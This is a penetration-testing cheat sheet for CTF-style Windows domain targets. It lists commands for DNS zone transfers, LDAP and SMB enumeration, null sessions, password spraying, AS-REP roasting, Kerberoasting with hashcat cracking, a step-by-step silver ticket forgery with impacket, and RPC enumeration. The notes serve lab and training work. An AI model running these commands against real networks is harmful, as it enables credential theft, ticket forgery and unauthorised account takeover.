# Tips
## Multiple users
If there's more than one user that needs to compromised before getting root, enumerate
each user as they might have access to something new that was protected before.

## Temporary account
If some info suggests that an account is only temporary, than they might have some misconfigurations
or rights that other users don't have.     
Especially if they're created by a user which is in a group that has higher privileges.



# DNS
##  dig
```bash
# Normal DNS request
dig A @<ip> <domain> 

# Get all available entries
dig any server.local @<DNS_IP>

#Zone transfer without domain
dig axfr @<DNS_IP>

#Zone transfer with domain
dig axfr @<DNS_IP> <DOMAIN>
```

## gobuster
```bash
# Subdomain scan
gobuster dns -d domain.local -t 25 -w <wordlist>
```

## nmap
```bash
nmap -sSU -p53 --script dns-nsec-enum --script-args dns-nsec-enum.domains=paypal.com <domain>
```

## metasploit
```
auxiliary/gather/enum_dns
```



# LDAP
## ldapsearch
***Without credentials**
```bash
# Anonymous access
ldapsearch -H ldap://<ip>:<port> -b "dc=domain,dc=local" -x

# Naming Contexts
ldapsearch -h <ip> -x -s base namingcontexts

# Get all info
ldapsearch -h <ip> -x -b "dc=domain,dc=local"

# Filter people
ldapsearch -h <ip> -x -b "dc=domain,dc=local" '(objectClass=person)'

# Filter users
ldapsearch -h <ip> -x -b "dc=domain,dc=local" '(objectClass=user)'

# Filter groups
ldapsearch -h <ip> -x -b "dc=domain,dc=local" '(objectClass=group)'
```   
***With credentials**
```bash
ldapsearch -H ldap://<ip> -b "dc=domain,dc=local" -D "cn=username,dc=domain,dc=local" -w <password>   -x

ldapsearch -h <domain.local> -D 'user@domain.local' -w <password> -b "DC=domain,DC=local"
```

## windapsearch.py
LDAP enumeration script      
**[Documentation and Release](https://github.com/ropnop/windapsearch)**
```bash
# Anonymous login
windapsearch.py --dc-ip <ip> -d domain.local -u "" -U
```

## nmap ldap
Basic info about the domain
```bash
nmap -sT -Pn -n --open <ip> -p389 --script ldap-rootdse
```

## Notes
### Passwords in result
If an `ldapsearch` query comes back with users, try checking whether they have any password related options set.    

**Example(s)**
```
cascadeLegacyPwd: BASE64 STRING
```

### Info field
Log of a query might contain some info in the user.     
In many CTF-s they put passwords there.
​


# SMB
## Enumeration

### smbmap
```bash
# Without creds
smbmap -H <ip>

# With creds
smbmap -H <ip> -u <user> -p <password>
```

### CrackMapExec
```bash
# Enumerate users
crackmapexec smb <ip> -u <user> -p <password> --users

# Perform RID Bruteforce to get users
crackmapexec smb <ip> -u <user> -p <password> --rid-brute

# Enumerate domain groups
crackmapexec smb <ip> -u <user> -p <password> --groups

# Enumerate local users
crackmapexec smb <ip> -u <user> -p <password> --local-users
```

### enum4linux
```bash
enum4linux -U -o <ip>
```

### Null session attack
```bash
smbclient -N -L \\\\<ip>

crackmapexec smb <ip> -u ""
```

### Bruteforcing and password spraying
```bash
crackmapexec smb <ip> -u <username/file> -p <password/file>
```

## Establishing connection
### smbclient
```bash
smbclient //<ip> -U <user>
```

### smbclient.py
*impacket-smbclient*

```bash
# Normal login
smbclient.py <domain>/<username>:<password>@<ip>

# Auth with kerberos
smbclient.py -k <domain>/<username>:<password>@<ip> -dc-ip <ip>
```



# Kerberos
## GetNPUsers.py
Impacket's `GetNPUsers.py` will attempt to harvest the non-preauth AS_REP responses for a given list of usernames

```bash
GetNPUsers.py domain.local/ -dc-ip <ip> -usersfile <username_file> -format hashcat -outputfile <output>
```

## Kerberoasting
Kerberoasting is a post-exploitation attack technique that attempts to obtain a password hash of an Active Directory account that has a Service Principal Name.
```bash
GetUserSPNs.py -request -dc-ip <ip> domain.local/user -save -outputfile <output_file>
```

### Cracking the ticket
```bash
hashcat -m 13100 --force <hash_file> <password_file>
```

### Troubleshooting
#### NTLM hash disabled
Use the `-k` option as well as `-dc-host` instead of `-dc-ip`. As the latter will break the authentication and throw an error.

## References
- [https://www.crowdstrike.com/cybersecurity-101/kerberoasting/](https://www.crowdstrike.com/cybersecurity-101/kerberoasting/)


## Silver ticket attack
A Silver Ticket is a forged TGS (Ticket Granting Service) ticket, which is used directly between the client and the service, without necessarily going to the DC. Instead, the TGS ticket is signed by the service account itself, and thus the Silver Ticket is limited to authenticating only the service itself.      
**[https://www.crowdstrike.com/cybersecurity-101/attack-types/silver-ticket-attack/](https://www.crowdstrike.com/cybersecurity-101/attack-types/silver-ticket-attack/)**


### Steps
1. Generate NTLM hash
    ```bash
    iconv -f ASCII -t UTF-16LE <(printf "password") | openssl dgst -md4
    ```
2. Get Domain SID
    *Use impacket-getPac*
    ```bash
    getPac.py -targetUser <username> <domain>/<username>:<password>
    ```
3. Generate ticket
    *Use impacket-ticketer*
    ```bash
    ticketer.py -nthash <ntlm_hash> -domain-sid <sid> -domain <domain> -dc-ip <ip> -spn <service_spn> <username>
    ```
4. Add the ticket location to `KRB5CCNAME`
    ```bash
    KRB5CCNAME=<username>.ccache klist
    ```



# RPC
## Enumeration
```bash
# USERS
querydispinfo
enumdomusers

## User details
queryuser <rid>

## User groups
queryusergroups <rid>

## SID
lookupnames <rid>

## Aliases
queryuseraliases builtin <username>


# GROUPS
enumdomgroups

## Group Details
querygroup <rid>

## Group members
querygroupmem <rid>


# SHARES
netshareenumall

## Share details
netsharegetinfo <share>
```

## Establishing connection
```bash
# Null authentication
rpcclient -U '' -N <ip>

# With creds
rpcclient -U <username> <ip>
```



# Analyse office files
Modern `Office` documents are just zip archives with XML files so, just unzip it and look for data within the XML files.

## Unzip
```bash
unzip <file>
```

## oletools
oletools is a package of python tools to analyze Microsoft OLE2 files (also called Structured Storage, Compound File Binary Format or Compound Document File Format), such as Microsoft Office documents or Outlook messages
```bash
# Download tools
sudo pip3 install -U oletools

# Extract macros
olevba -c <file>
```